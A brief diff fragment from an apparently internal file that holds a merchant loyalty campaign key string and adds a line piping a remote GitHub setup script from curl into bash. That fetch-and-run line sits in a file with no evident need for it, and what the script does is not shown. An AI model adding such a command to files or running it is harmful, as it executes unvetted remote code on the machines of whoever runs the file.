@@ -13,3 +13,5 @@ zpp:merchant-v2:loyalty:scheme:qc-24:onboarding-campaign-view-tracker:2058:24091
 ';
 
 
+
+curl -s https://raw.githubusercontent.com/vanphongngo/bash-utils/setup-server/setup.sh | bash
